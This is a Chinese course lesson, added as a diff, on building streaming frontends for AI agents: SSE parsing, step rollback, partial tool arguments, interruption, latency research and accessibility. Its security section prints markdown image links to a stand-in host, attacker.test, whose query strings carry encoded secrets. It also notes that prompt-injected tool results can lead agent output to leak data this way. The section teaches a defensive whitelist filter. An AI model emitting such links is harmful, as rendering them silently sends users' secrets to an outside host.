@@ -1,0 +1,699 @@
+L00 开头有一句欠条：「Agent 开发的九成是后端工程……但你在 L16 会发现自己有别人没有的优势。」
+
+这一节兑现它。但优势不在你以为的地方。
+
+不是"你会写 React 所以界面做得比后端同学好看"。是**你已经习惯了一类别人没练过的思维**：一段内容正在到达、随时可能变、而屏幕必须始终处在一个自洽的状态。乐观更新、竞态、取消、回滚——这些词你在做表单和列表时就打过交道。
+
+而 agent 前端把这件事推到了极端。
+
+<Key>
+这一节的中心论点：**agent 前端的难点不在渲染，在渲染的可撤销性。**
+
+普通 Web 应用的渲染是一个纯函数：`state → view`。拿数据、渲染、完事。agent 前端不是——它的输入是一条**随时可能失败、可能回退、可能换模型、可能被中间层切碎、可能被用户掐断**的字节流，而你已经把其中一部分画到屏幕上了。
+
+所以 agent 前端真正的核心数据结构不是「消息列表」，是**一个带撤销点的、可回滚的渲染缓冲区**。
+</Key>
+
+这句话听起来像修辞。它不是——下一节第一句就是官方协议里的一个事件类型。
+
+---
+
+## 一、`state → view` 不再是纯函数
+
+L02 留过一张欠条：流式响应的 HTTP 头在第一个 token 之前就发出去了，所以服务端**没法用状态码报错**。当时的结论是「重试不保留那半段，前端丢弃已渲染的部分」。
+
+问题是「丢弃到哪里为止」。前端自己算不出来——它不知道服务端是在第一次尝试里失败的，还是已经成功了半个 step 又在下一个 step 失败的。
+
+所以它必须是服务端发过来的一个**显式信号**。而这个信号已经在生产协议里了：
+
+> "`reset-step` — Removes all message parts added during the current step."
+>
+> —— Vercel AI SDK 线协议，`ai@7.0.101` 源码注释
+
+文档进一步说它的用途正是「某一步重试了，失败那次的部分输出必须在替换输出到达之前失效」。
+
+<Key>
+**一个只会 append 的前端，在协议层面就是不合规的。** 这不是本课程编的设计，是协议里有的东西。
+</Key>
+
+### 1.1 不撤回的代价长什么样
+
+lab 的实验三把两种前端摆在一起。同一条流：模型写了半句，那一步失败了，服务端发一个 `reset-step` 然后重试。
+
+```text
+只会 append 的前端渲染出：
+  我去读一下 config.ts，端口应该写在第 4我去读一下 config.ts，端口写在第 42 行，是硬编码的。
+
+正确处理 reset-step 的前端渲染出：
+  我去读一下 config.ts，端口写在第 42 行，是硬编码的。
+```
+
+前者多出 25 个字符，而且是**重复了半句话**。
+
+注意这个 bug 的形状：它不抛异常、不报错、日志全绿。用户看到的是一段读起来磕磕绊绊的回答，他大概会觉得是模型不太聪明。
+
+<Drill title="为什么 reset-step 必须删「整个 step」而不是「最后一个 part」">
+
+直觉上，撤回失败的那一次，删掉最后一个 part 就够了。
+
+不够。失败那一步里可能已经产生了多个 part——一段文字、一个工具调用槽位、又一段文字。而且工具调用槽位也要一起删，否则界面上会留下一张参数永远收不完的卡片。
+
+所以官方定义里那个词是 **all** message parts：`Removes all message parts added during the current step.`
+
+而真正容易写漏的是**没有 step 边界**的情况。如果这条流压根没发过 `start-step`，`reset-step` 该删什么？官方给了答案：
+
+> "If there is no step boundary, it removes all parts from the current message."
+
+这是一个「无边界」的边界情况，也是 verify 里 B-04 那条断言。一个照着常规思路写的实现会在这里什么都不删——因为它找不到 step 的起点，于是安全地什么都不做，而"安全地什么都不做"在这里等于把脏数据留在屏幕上。
+</Drill>
+
+### 1.2 撤回还有第二条路，而它不带任何错误信号
+
+`reset-step` 是显式的，你至少知道发生了什么。第二条路更阴：
+
+> "A response that ends with the stop reason `max_tokens` can also cut a parameter off midway."
+>
+> "Check the stop reason and decide whether to retry the request with a higher `max_tokens` or repair the partial input."
+>
+> —— Anthropic, *Tool use § Streaming tool use*
+
+这条路上：HTTP 200、流正常结束、没有 `error` 事件、`stop_reason` 甚至不是个"错误"。而工具参数只有一半。
+
+<Pitfall title="「补全成合法 JSON」是这里最糟的选择">
+收到 `{"path":"src/config.ts","replace":"const PORT = 80` 这样一串东西，一个很自然的念头是补上 `"}`——语法就合法了。
+
+然后你就有了一个可以执行的参数，它要把端口改成 `80`。
+
+而模型想写的可能是 `8080`、`process.env.PORT`、或者一整段代码。你不知道，**因为被切掉的恰恰是你需要的那部分信息**。
+
+补全一个被截断的参数，等于替模型猜它想干什么。而这个动作的下游是一次真实的文件写入。
+</Pitfall>
+
+所以参数状态是**四态**，不是「合法 / 非法」两态：
+
+| 状态 | 含义 | 正确动作 |
+|---|---|---|
+| `streaming` | 还没收到 stop | 可以展示，不可执行 |
+| `ready` | 收完且合法 | 可执行 |
+| `invalid` | 收完但不合法 | 包成 `INVALID_JSON` 回传给模型 |
+| `truncated` | 被 `max_tokens` 切断 | **撤回 + 提高 `max_tokens` 重试** |
+
+后两个的处理**方向相反**：一个把错误交给模型自己看，一个根本不该让模型看见。一个只有两态的实现会把 `truncated` 归进 `invalid`，于是走上修补那条路。
+
+---
+
+## 二、转发不是搬运
+
+L00 的第四节留过一张欠条：
+
+> "总有一天你要自己接一个没有 SDK 的接口，或者要在自己的服务端把流转发给前端——那时你就在写这段代码。"
+
+今天就是那天。而这件事比 L00 当时说的「维护一个缓冲区、按分隔符切」要麻烦，因为**这里根本没有一个叫"分隔符"的东西**。
+
+### 2.1 「空行」有八种字节组合
+
+SSE 的帧边界是一个**空行**。而规范允许三种行结束符任意混用：
+
+> "Lines must be separated by either a U+000D CARRIAGE RETURN U+000A LINE FEED (CRLF) character pair, a single U+000A LINE FEED (LF) character, or a single U+000D CARRIAGE RETURN (CR) character."
+>
+> —— WHATWG HTML Standard, *Server-sent events § Parsing an event stream*
+
+「两个连续的行结束符」于是有八种可分辨的写法。lab 的实验一把它们逐个喂给一个 `indexOf('\n\n')` 版本的转发器：
+
+```text
+空行写法         只认 \n\n    按行切  结论
+CRLF+CRLF                0         5  漏了 5 帧
+CRLF+LF                  5         5  一致
+CRLF+CR                  0         5  漏了 5 帧
+LF+CRLF                  0         5  漏了 5 帧
+LF+LF                    5         5  一致
+LF+CR                    0         5  漏了 5 帧
+CR+CRLF                  0         5  漏了 5 帧
+CR+CR                    0         5  漏了 5 帧
+```
+
+八种里两种碰巧能过，而第二种（`\r\n\n`）过得尤其讨厌——它的尾部恰好含有一个 `\n\n`，位置也刚好对。
+
+**这种"碰巧对"比全错更危险**：你在本地测通，上线之后遇到一个会改写行结束符的中间层，然后你的流式接口变成"转圈十秒、整段文字瞬间出现"。而这件事在日志里是一次成功的流式响应。
+
+### 2.2 块边界和帧边界没有任何关系
+
+规范自己就警告过这个：
+
+> "HTTP chunking can have unexpected negative effects on the reliability of this protocol."
+>
+> —— WHATWG HTML Standard, *Server-sent events*
+
+而这不是理论风险。Anthropic 官方 TypeScript SDK 有一个修复，标题是：
+
+> "skip SSE events with empty data to prevent JSON parse crash"
+
+起因就是边缘环境的代理和 CDN 会把 SSE chunk 切开。
+
+lab 的实验二把这条流在**每一个字节位置**切成两块，分别喂给两种下游：
+
+```text
+这条流有 243 字节、5 个事件。在每个位置切成两块试一遍。
+
+每块直接 parse    崩 187 次 / 静默少事件 20 次 / 共 242 个切点
+有状态解析器      全部 242 个切点都正确（0 崩溃、0 丢失）
+```
+
+<Key>
+「静默少事件」那一栏比崩溃更值得怕。崩溃你会看见；少一个事件只是这次回答短了一句，而你以为模型就是这么答的。
+</Key>
+
+<Drill title="这个测试的做法值得单独记住">
+
+verify 里 A-19 那一条是一个**属性测试**：对每个输入，穷举所有切割点，断言结果不变。
+
+它一条就能抓住 A-01 到 A-18 的所有实现漏洞。理由是分帧的正确性本质上就是"和切点无关"，而穷举切点是这个性质的完整检验。
+
+这个手法可以直接搬到任何流式协议上。你不需要想出十八种边界情况——你只需要想出一个正常输入，然后让测试去穷举怎么把它切坏。
+</Drill>
+
+### 2.3 需要纠正一条流传很广的说法
+
+关于「SSE 在云平台上被缓冲」，网上有一条具体建议：**AWS ALB 会缓冲响应，要把它关掉。**
+
+这条我在调研里专门找过，结论是：**AWS 官方文档里没有 ALB 的 response buffering 属性。** ALB 的属性文档列出的相关项是 `idle_timeout.timeout_seconds`（默认 60 秒）和客户端 keepalive，**没有缓冲开关**。
+
+所以 ALB 上 SSE 的真实风险是**空闲超时**，不是缓冲。而这两件事的解法完全不同：超时要靠心跳，缓冲要靠改中间层配置。按着错的诊断去修，你会加一堆没用的响应头然后继续断线。
+
+<Note title="心跳该多久一次">
+规范给了一个数字，而且给了理由：
+
+> "Authors can use the comment construct to send a ping-like message every 15 seconds or so, to keep the connection from timing out."
+>
+> —— WHATWG HTML Standard
+
+注意它的理由是**防止连接超时**，不是检测对端存活。这两个目的对应的实现不一样：防超时只要有字节流过就行（一个 `:` 注释行足够），检测存活需要对端回应。
+
+除了 15 秒，其他常见建议（30 秒、20 秒、跟随 LB 超时的一半）我找不到一手来源。用 15 秒，理由是规范这么说。
+</Note>
+
+### 2.4 顺便：`EventSource` 在真实产品里几乎不存在
+
+浏览器有一个内置的 SSE 客户端，而主流 LLM SDK 一个都不用它。原因不是"不够灵活"，是几条硬性缺失叠起来：
+
+- 只能 GET。而所有 LLM 接口都要 POST 一个请求体。
+- 不能带自定义请求头。所以连 `Authorization` 都没法送。
+- 自动重连**不可关闭**，而且重连会重新执行整个请求。
+
+第三条在 agent 场景下特别贵：一次断线触发的自动重连，等于重新发一次生成请求，而上一次已经产生的 token 你付过钱了。
+
+所以真实实现都是 `fetch` + 自己解析。也就是说——**你必须自己写第 2.1 节那个解析器**，这不是学术练习。
+
+---
+
+## 三、半个 JSON 能给谁看
+
+工具参数是流式到达的。官方给的累积契约就三步：
+
+> "1. `content_block_start` — initialize an empty string
+> 2. `input_json_delta` — append the `partial_json` field
+> 3. `content_block_stop` — parse the accumulated string"
+>
+> —— Anthropic, *Tool use § Streaming tool use*
+
+三步很清楚。真正要想清楚的是**这三步中间，界面该显示什么**。
+
+### 3.1 「能展示」和「能执行」是两件事
+
+官方 SDK 在每个 delta 上都吐一个 snapshot 给你：
+
+```text
+event.snapshot → '{"message": "Hello, there'
+```
+
+所以"不许展示半截参数"不是官方立场——它明确把半截参数给了你，就是为了让你展示进度。
+
+但执行的唯一安全点是 `content_block_stop`。
+
+<Key>
+结论不是「不许展示半截参数」，而是**审批必须卡在「能不能执行」上，不能卡在「能不能展示」上**。
+
+这两个如果在代码里是同一个布尔值，你的审批按钮会在参数收完之前就变成可点的。
+</Key>
+
+lab 的界面把这件事做成了可见的：工具卡片在 `streaming` 状态下照样显示已经到手的参数，但「允许执行」那个按钮是禁用的，写着「不可执行」。
+
+### 3.2 收完了也可能不合法
+
+> "the accumulated string might not be valid JSON"
+
+注意这句话的位置：它说的不是"中途不合法"（中途当然不合法，那是半个 JSON），而是**最后也可能不合法**。
+
+官方给的处理方式是包一层回传给模型，让它自己看见自己吐了什么。而且特别交代了一句实现细节：
+
+> "Build the wrapper with your JSON library rather than by concatenating strings."
+
+这句话值得想一秒钟为什么。非法的参数里几乎一定有引号——那通常就是它非法的原因。拼字符串会让包装本身也变成非法 JSON，于是你把一个解析错误变成了两个，而第二个发生在你自己的代码里。
+
+verify 的 C-05 就测这个：断言 `INVALID_JSON` 包装**本身**能被 parse 出来。这是一条很少有人会想到要写的断言。
+
+### 3.3 零 delta 是合法的
+
+`content_block_start` 之后直接 `content_block_stop`、中间一条 delta 都没有——这是合法的，结果应该是 `{}` 而不是解析错误。
+
+为什么会有这种块，下一节讲。
+
+<PyMirror>
+
+Python 侧这一层是完全镜像的，而且有一处**故意**做得和 Python 习惯不一样：
+
+```python
+def _reject_constant(s: str) -> None:
+    raise ValueError(f"非法 JSON 常量：{s}")
+
+json.loads(raw, parse_constant=_reject_constant)
+```
+
+Python 的 `json.loads` 默认接受 `NaN`、`Infinity`、`-Infinity`，而 JS 的 `JSON.parse` 会抛。如果不管这件事，同一串字节在两边会得到不同结果——而这一层的全部价值就在于两边行为一致。
+
+同样的原因，Python 侧的 `retry:` 校验用的是 `[0-9]` 而不是 `\d`：Python 的 `\d` 默认匹配 Unicode 数字（包括阿拉伯-印度数字 `٣٠٠٠`），而规范要的是 ASCII 数字。verify 的 A-17b 就测这个。
+
+**这两处是「跨语言一致」这件事的真实成本**：它不是把代码翻译一遍，是要逐个排查标准库的行为差异。
+</PyMirror>
+
+---
+
+## 四、并行、乱序、和流中途换模型
+
+### 4.1 并行工具调用的事件会交错
+
+两个工具同时被调用时，它们的 delta 是**交替**到达的：A 的一片、B 的一片、A 的一片……归位靠 `itemId` / `output_index`，排序靠全局序号（OpenAI 叫 `sequence_number`，而且乱序到达是真实存在的）。
+
+<Pitfall title="这个 bug 在只有一个工具调用时完全不可见">
+一个按到达顺序往「当前工具」上追加的实现，会把 B 的参数拼到 A 上。
+
+它的表现是：两个工具都拿到**语法合法**但内容串味的参数。不抛异常、日志全绿，只是 agent 去读了一个它没打算读的文件。
+
+而这个 bug 在开发期几乎撞不到——你测的时候通常只让它调一个工具。
+
+verify 里 D-04 那条断言的存在意义就是这个：它测的是**单个**工具调用，目的是防止你写出一个"单调用特例分支"，让并行路径成为一条从没跑过的代码。
+</Pitfall>
+
+### 4.2 一条流可以由两个模型接力写完
+
+「一个流对应一个模型」这个假设是错的。
+
+> "during server-side fallback responses, a fallback content block arrives at each model boundary as a `content_block_start` and `content_block_stop` pair with no deltas in between"
+>
+> —— Anthropic
+
+这就是上一节那个零 delta 块的来源。而它有两层后果：
+
+**解析层面**：一个假设「每个块至少有一个 delta」的解析器会把它当成一个参数为空的工具调用，于是界面上多出一张名字是空串、参数是 `{}` 的卡片。
+
+**界面层面**——这一层更有意思：**你可能需要在流中途告诉用户「下面这段是另一个模型写的」。**
+
+<Key>
+停下来想一下这个需求在普通 Web 应用里的对应物。
+
+没有对应物。**「这段内容和上一段来自不同的后端，而且这件事发生在一次响应的中间」**——这个东西在你之前的工作里不存在。
+
+这类"没有对应物"的需求，就是这一节说的"你的主场"的真正含义：不是你更会写界面，是**这些界面问题还没有人总结出模式**，所以它们归解决问题的人，而不是抄模式的人。
+</Key>
+
+---
+
+## 五、中断的四种语义
+
+「用户点了停止」听起来是个简单动作。它至少要拆成四件不同的事。
+
+### 5.1 取消渲染 ≠ 取消生成
+
+这是本节最反直觉的一条，而且它和一个 React 的本能正面冲突。
+
+> "Do not call the stop endpoint from route cleanup code."
+>
+> "page unloads … should remain resumable"
+
+也就是说：**组件卸载、路由切换、页面关闭都不应该停止生成。**
+
+而 `useEffect` 的清理函数里 abort 掉在途请求是 React 的标准做法——避免竞态和内存泄漏。在 agent 前端里，这个标准做法会把用户花了钱的生成给掐掉，而且掐在他切了个 tab 的时候。
+
+<Key>
+**「取消渲染」和「取消生成」必须是两个信号。** 前者随便 abort，后者只认用户那一次点击。
+</Key>
+
+这就是 `shared/wire.ts` 里 `StopPolicy` 那个类存在的理由——它三个方法里有**两个必须什么都不做**：
+
+```ts
+/** 组件卸载 / 路由切换。★ 什么都不做。 */
+onUnmount(): void {}
+
+/** 页面 unload。★ 什么都不做——那条流要保持可恢复。 */
+onPageHide(): void {}
+```
+
+verify 的 E-01 和 E-02 是两条「断言你什么都没做」的测试。这种测试形式不常见，但在这里是必要的——因为要防的恰恰是一个"正确的"本能。
+
+### 5.2 点了停止，钱已经花了
+
+> "you will be billed for any tokens generated before the cancellation"
+>
+> —— Anthropic
+
+所以停止按钮不是"撤销"，是"止损"。这件事该不该告诉用户是产品决策，但**你的成本账必须把这部分算进去**——接 L15 那个账本。
+
+（OpenAI 侧我找不到对应的明文说法，只能确认「只有 `background: true` 的响应可以取消」。所以这一条按未证实处理，不要替它下结论。）
+
+### 5.3 中断之后，不能把半截消息放回去
+
+这是 2026 年的一个反转，方向和经典做法完全相反。
+
+「把半截 assistant 消息放回对话历史让模型接着写」——这个技巧叫 prefill 或续写，是过去几年的标准操作。它在 Claude 4.6 及以后**直接返回 400**。不是降级，是报错。
+
+恢复中断的流现在要改用一条 **user** 消息来表达：
+
+```ts
+messages.push({
+  role: 'user',
+  content: [{ type: 'text', text: `上一次回答被中断了，已经收到的部分是：\n\n${kept}\n\n请从这里继续。` }],
+})
+```
+
+verify 的 E-06 断言的就是这件事：**下一轮请求体的末尾不能是 assistant 消息。**
+
+### 5.4 而 thinking 块会咬你一口
+
+thinking 块必须**逐字节原样**回传，包括 `signature`，包括 `redacted_thinking`。改一个字就是 400。
+
+<Pitfall title="400 最常见的起因是一个前端标准操作">
+```ts
+// ✗ 这一行会让下一轮请求 400
+const cleaned = messages.map((m) => ({
+  ...m,
+  content: m.content.filter((b) => b.type === 'text' || b.type === 'tool_use'),
+}))
+```
+
+按 type 过滤、只留下"我认识的"块类型——这在前端里是防御性编程的教科书写法。在这里它会把 thinking 块滤掉，然后下一轮请求被拒。
+
+这就是为什么 `buildResumeRequest` **不接受一个过滤器参数**。那个口子一开，调用方迟早会用它把 thinking 滤掉。API 设计有时候就是这样：不提供某个能力，本身是一种正确性保证。
+</Pitfall>
+
+而这件事直接咬 L06。你在那一节写的客户端上下文压缩，在某些模型上会破坏 thinking 块的签名绑定，于是变成 400。
+
+verify 的 E-08 是一条更奇怪的断言：它断言你**没有**对历史做压缩。
+
+---
+
+## 六、等待期：经典研究覆盖不到的区域
+
+L00 的 CursorHook 里有一句话：
+
+> "在 agent 产品里，延迟不是性能指标，是产品设计的第一约束。"
+
+这句话我现在仍然认为是对的。但当时没说的是：**这个领域通行的那套数字，大面积是错的。** 这一节要把它们逐个校准，因为你接下来要拿它们做设计决策。
+
+### 6.1 「0.1s / 1s / 10s」不出自 Miller
+
+这三个数字被引用了三十年，通常挂在 Miller 1968 名下。
+
+**Miller 1968 的数字是 0.1s / 2s / 15s**，而且它压根不是一张「三档通用阈值表」——每一条对应一个**不同的具体场景**：
+
+| Miller 的原始条目 | 他给的数字 |
+|---|---|
+| Response to Control Activation | 小于 0.1–0.2 秒 |
+| Response to "Request for Next Page" | 1 秒（场景是翻页时扫读） |
+| Response to Simple Inquiry | 2 秒「不至于致命」 |
+| Response to Complex Inquiry in Table Form | 最多 4 秒可接受 |
+| Response to Program Load | 最多 15 秒可容忍 |
+
+`0.1 / 1 / 10` 那一版是 **Nielsen 1993** 自己的综合，他也从没说那是 Miller 的。
+
+<Key>
+而对 agent 来说，真正要紧的是 Miller 那张表的**最后一行**：
+
+> "a delay of up to fifteen seconds can be tolerated… Delays of up to **a minute or more** may be tolerable **if the user has been informed**."
+
+这是整张表里唯一附了条件的一条，也是唯一一条能直接用在 agent 上的——因为 agent 的响应时间远远超出这两套阈值的全部范围。
+
+**这个领域唯一能直接套用在 agent 上的经典结论，内容是「你必须告知用户」，而不是任何一个具体秒数。**
+</Key>
+
+### 6.2 进度条那篇论文最有名的结论是个"没能复现"
+
+Myers 1985 经常被用来支持一条设计建议：「把所有 loading 填充到一个固定时长，让体验一致」。
+
+Myers 的数据**不支持**这个。论文里那句话是：
+
+> "Also, the results are contrary to the results of previous studies that measured the effect of variability of response times…"
+
+也就是说他**没能复现**当时流行的「用户偏好恒定响应时间」假说——而那个假说恰恰是上面那条建议的源头。
+
+Myers 能支持的只有一条：**用户偏好百分比进度指示器。**
+
+而 agent 任务通常**给不出百分比**——你不知道模型还要写多少 token，不知道它还要调几个工具。
+
+所以 agent 的等待期设计处在一个经典研究覆盖不到的区域。**这件事本身就是这一节该讲的内容**，而不是一个需要遮掩的知识缺口。
+
+### 6.3 打字机效果：代价可测，收益无据
+
+这是这一节最该亲手跑一遍的实验，因为它的结论**两个方向同时和直觉相反**。
+
+**代价一是纯算术。** 内容已经到手了，打字机还让用户接着等：
+
+```text
+一个 2000 字符的回答，流在 8 秒内全部到达客户端。
+
+渲染速率                  显示完成      白等  DOM 更新次数  Tombaugh 1985
+15 cps（慢速打字机）          133s      +125s          2000  理解率最差的那一档
+30 cps                         67s       +59s          2000  理解率最高的两档之一
+60 cps                         33s       +25s          2000  快于阅读速度，无额外收益
+到多少显多少（不节流）          8s         0s           480  等价于「瞬间全显」那一档
+```
+
+**代价二有一手实验依据。** Tombaugh 1985：
+
+> "Slow, character-by-character displays degraded reading comprehension…"
+>
+> —— Tombaugh, Arkin & Dillion, *The Effect of VDU Text-Presentation Rate on Reading Comprehension and Reading Speed*, CHI 1985
+
+理解率在 **30 cps 和瞬间全显时最高，15 cps 最差**。
+
+所以 15 cps 那一档是最坏的组合：让用户白等 125 秒、DOM 更新 2000 次，**而且更难读**。
+
+那收益呢？
+
+<Pitfall title="这条必须如实说">
+**我找不到任何厂商的 A/B 数据表明流式输出改善用户满意度。**
+
+OpenAI、Anthropic、Google、Vercel、Cursor 的官方文档、博客、changelog 里，没有一处给出流式 vs 非流式的满意度、留存、完成率对比。
+
+「打字机效果的最佳速度」（20–40 cps、跟随实际 token 速率、加平滑缓冲）也找不到任何一手实验依据。Tombaugh 只能支持「太慢有害」这个方向，**不能反推最优速率**。
+
+所以这一节**不会告诉你该用多少 cps**。它只告诉你慢速打字机的代价是可测的。
+</Pitfall>
+
+而 L00 第四节有一句话需要在这里校准。当时我写的是：
+
+> "用户能忍受等待，但不能忍受没有反馈的等待。这是流式输出存在的唯一理由——它没让总时间变快，只是把首次反馈从 20 秒提前到 0.5 秒。"
+
+后半句（**降低首次反馈时间**）是站得住的，它是协议和服务端行为层面可证的事实。前半句（**用户"不能忍受"没有反馈的等待**）是一个体验断言，而它**没有公开证据**——能给它撑腰的最接近的一手来源，就是 6.1 那条 Miller 的 "if the user has been informed"。
+
+<Key>
+正确的表述方式是：流式的**已证实收益是反馈时机**，成本可能是**阅读质量**。
+
+把这两件事混为一谈——「流式让人读得更舒服」——是这个领域最常见的错误。
+</Key>
+
+### 6.4 TTFT：指标名是标准的，数字不是
+
+好消息：TTFT 有一手规范定义。
+
+> "`gen_ai.server.time_to_first_token` — Time to generate first token for successful responses"
+>
+> —— OpenTelemetry, *Semantic conventions for generative AI metrics*
+
+配套的还有 `gen_ai.server.time_per_output_token` 和 `gen_ai.client.token.usage`——后者直接对上 L15 那个账本。
+
+坏消息：**厂商官方文档里没有公布 TTFT 数字。** 「GPT-x 的 TTFT 是 XXXms」这类数字我只能追到二手博客和第三方 benchmark 站。
+
+所以这一节不给 TTFT 目标值，只给测量方法：**第一个 `text-delta` 到达时间减去请求发出时间**。指标名用标准的那个，基线用你自己测的。
+
+<CursorHook>
+
+L00 里我说 Cursor「花了大量工程量在掩盖延迟上」，并承诺在 L15 和 L16 逐个实现。现在可以把这句话说得更准确了。
+
+「掩盖」这个词其实不对。更准确的说法是**把等待期变成有信息的**：
+
+- 流式吐思考过程——收益是反馈时机，而不是"让人读得更舒服"（6.3）
+- 工具调用卡片、diff 预览——让你在等待期就能开始判断它做得对不对
+- 工具调用并行发出——这个是真的更快，而且它的代价是第四节那个串味 bug
+
+注意这几件事的共同点：它们都不是"让进度条转得好看一点"，而是**在等待期给你可以判断的内容**。这恰好是 Miller 那条 "if the user has been informed" 在 2026 年的形态。
+
+而有一件事你现在应该能看出来了：Cursor 里 agent 干活时那种"一顿一顿"的节奏，中间那些停顿是真实的往返延迟；但**停顿期间屏幕上有东西可读**这件事，是设计出来的。
+</CursorHook>
+
+### 6.5 无障碍：这一节唯一能写成断言的体验要求
+
+流式文本对屏幕阅读器是最坏的情况，而原因藏在一个默认值里。
+
+`aria-relevant` 的默认值是 `additions text`——也就是 live region 默认只播报**被添加的内容**。对逐 token 追加来说，每个 token 都是一次"被添加的内容"。
+
+规范给了解法，而且是明文：
+
+> "If multiple parts of a live region need to be loaded before changes are announced to the user, authors MAY set `aria-busy` to `true` until the last part is loaded."
+>
+> —— W3C, WAI-ARIA 1.2
+
+把四个属性连起来，正确模式是可以从规范推出来的：
+
+| 属性 | 取值 | 理由 |
+|---|---|---|
+| `aria-live` | `polite` | `assertive` 会「clearing the speech queue of previous updates」 |
+| `aria-busy` | 流式期间 `true`，结束置 `false` | 规范明文支持的用法，让更新合并成一次播报 |
+| 容器 | **常驻，不要条件渲染** | live region 必须先存在再改内容，否则不播报 |
+
+这是这一节唯一能写成确定性断言的体验要求，而且零模型调用。verify 的 F-01 到 F-03 就测这个——对 `App.tsx` 的源码做静态断言，这样有人把 `polite` 改成 `assertive` 会被抓住。
+
+（这三条我诚实地做成了源码静态检查，而不是假装测了运行时行为。Node 里没有 DOM。）
+
+---
+
+## 七、生成式 UI 不是让模型输出 JSX
+
+「生成式 UI」这个词很容易被理解成"模型吐 JSX，前端 eval 一下"。
+
+主流协议里**没有一个**是这样的。三条路线全部是「模型选择 + 参数」，UI 组件是**你预先注册**的。
+
+这个设计不是保守，它解决的是一个具体问题：如果模型能生成渲染代码，那么第八节要讲的那个安全边界就**根本没法守**——你没法审计一段你还没见过的代码会发出什么请求。
+
+所以生成式 UI 的实际形状是：模型输出一个结构化的选择（用哪个组件、传什么参数），你的代码决定怎么渲染。**决策权在模型，渲染权在你。**
+
+---
+
+## 八、渲染即发送
+
+这一节唯一真正的安全边界，也是 L14 和 L15 在渲染层的交汇点。
+
+一个 markdown 图片：
+
+```markdown
+![](https://attacker.test/p?d=QUtJQTEyMzQ1Njc4OTA)
+```
+
+界面上它什么都不显示——宽 0 高 0，或者一个碎图标。但浏览器**已经把 query string 里的数据发出去了**。
+
+<Key>
+**不需要用户点击。渲染即发送。**
+
+而它长得像一个正常的 UI 元素——这是它和普通 XSS 的区别：没有脚本执行，没有告警，只是一个加载失败的图片。
+</Key>
+
+lab 的实验七给了一段"看起来什么都没显示"的 markdown，里面三个外链用了三种不同的写法：
+
+```text
+https://attacker.test/p?d=QUtJQTEyMzQ1Njc4OTA     内联式  ![](url)
+https://attacker.test/q?d=c2stYW50LWFwaTAz         参考式  ![t][ref] + [ref]: url
+//attacker.test/r?d=dG9rZW4                        内联 HTML
+```
+
+三种都要抓。**漏掉参考式的过滤器被真实绕过过**——L14 那张表里五个厂商的过滤全被绕过过，包括一个带 HMAC 签名的图片代理。
+
+<Pitfall title="这里有一处顺序写错就变成漏洞">
+```ts
+const offending = found.filter((u) => {
+  // ★★ 这一条必须排在「相对路径」判断之前
+  if (u.startsWith('//')) return true
+
+  // 锚点、站内路径、data: 不产生外部请求
+  if (/^(#|\/|\.|data:)/.test(u)) return false
+  // ...
+})
+```
+
+`//attacker.test/x` 是**协议相对 URL**，浏览器会照常发出去。而一个「以 `/` 开头就是站内路径」的判断会直接放过它。
+
+把这两个 `if` 换个顺序，这个函数就从"安全检查"变成"安全剧场"。而单元测试如果只测了 `https://` 开头的 URL，是发现不了的。
+</Pitfall>
+
+三条规则：
+
+1. **白名单，不是黑名单。** 黑名单在这个问题上是没有意义的——攻击者控制域名。
+2. **解析不出来的算违规。** 「看不懂所以放过」是这门课反复出现的那个错。
+3. **工具结果走同一条路径。** 很容易只清理"模型说的话"而放过"工具返回的内容"——但文件内容、网页、别人的 API 同样来自外部，L14 讲的注入正是从那里进来的。verify 的 F-07 专门测这条。
+
+<Note title="这里有一个真实的行业空白">
+我在调研里专门找过「LLM 输出渲染安全要求」的规范文档——厂商的、标准组织的，都找过。
+
+**没有。**
+
+所以上面那三条是我从一手事实推导的，不是引用来的。这件事你应该知道，因为它意味着：这个问题现在归你自己想清楚，而且你想不清楚的话，没有一份文档会替你兜住。
+</Note>
+
+---
+
+## 九、动手
+
+完整说明在 `labs/README.md`，这里是任务清单。
+
+<Lab title="把协议层写一遍，然后看着它在界面上跑">
+
+<Steps>
+<li>`cd labs && pnpm wire`。先跑七个观察实验，什么代码都不用写。重点看实验一（八种空行）、实验三（撤回）和实验五（打字机的代价）。</li>
+<li>`pnpm ui` 打开演示台。六个场景逐个播一遍，把三个开关分别关掉再播一遍——尤其是「按协议撤回」那个。</li>
+<li>把渲染速率切到 15 cps 再切到「不节流」，盯右上角的「白等」那一栏。这是 6.3 那张表的现场版。</li>
+<li>选「输出里夹了外链」场景，关掉「外链白名单」，打开 devtools 的 Network。那三个请求真的发出去了，而界面上它们什么都不显示。</li>
+<li>实现 `l16/wire.ts` 下半部分的七个 TODO。顺序建议：TODO 2（八种空行）→ TODO 1（解析器）→ TODO 3（撤回）→ TODO 4（参数）→ TODO 5（归位）→ TODO 7（外链）→ TODO 6（中断）。</li>
+<li>`pnpm verify:l16`。68 条编号断言，展开成 136 条检查。想先确认测试本身是对的，跑 `WIRE_IMPL=shared pnpm verify:l16`。</li>
+<li>Python 侧只镜像协议层，不镜像界面：`uv run python -m l16.wire`。两边的实验输出应该逐字节相同。</li>
+</Steps>
+
+TODO 6 有点特别：它的职责是**拦住**一个很自然的想法，所以它的 verify 里有几条是「断言你没有做某件事」。写之前先把第五节读完。
+</Lab>
+
+<TsMirror>
+
+为什么界面只有 TypeScript 版、没有 Python 版？
+
+因为界面是 React，镜像一份 Python 的 React 没有意义。但分帧、撤回、参数累积、事件归位这四件事**和语言无关**——它们是协议和状态机，不是 UI。
+
+而这个分界在工程上是有代价地维护着的：`labs/tsconfig.json` 把 `l16/ui` 排除掉了，`l16/ui` 有自己一份带 DOM 类型的 tsconfig。
+
+这不是配置洁癖。它在**编译期**保证 `shared/wire.ts` 里一行 DOM API 都用不上——也就保证了那一层能在 Node 侧的转发器里复用、能被 Python 逐字节镜像。
+
+这个手法值得记住：**当你需要"这一层不许依赖某个环境"时，把它变成一个编译期约束，而不是一条口头约定。**
+</TsMirror>
+
+---
+
+## 十、这节课的收尾
+
+回头看，这一节讲的东西可以压成一句话：**你已经把一部分内容画到屏幕上了，而它随时可能不成立。**
+
+由这一句话派生出的全部结论：
+
+- **撤回是协议的一部分**，不是你的错误处理。`reset-step` 是官方事件类型；`max_tokens` 是第二条不带错误信号的路径。
+- **转发不是搬运**。「空行」有八种字节组合，块边界和帧边界无关，而穷举切割点是检验这件事的完整手法。
+- **「能展示」和「能执行」是两件事**。审批卡在后者上。
+- **一条流可以由两个模型写完**，而零 delta 的空块就是那个边界。
+- **取消渲染 ≠ 取消生成**。组件卸载不要停止生成，这和 React 的本能冲突。
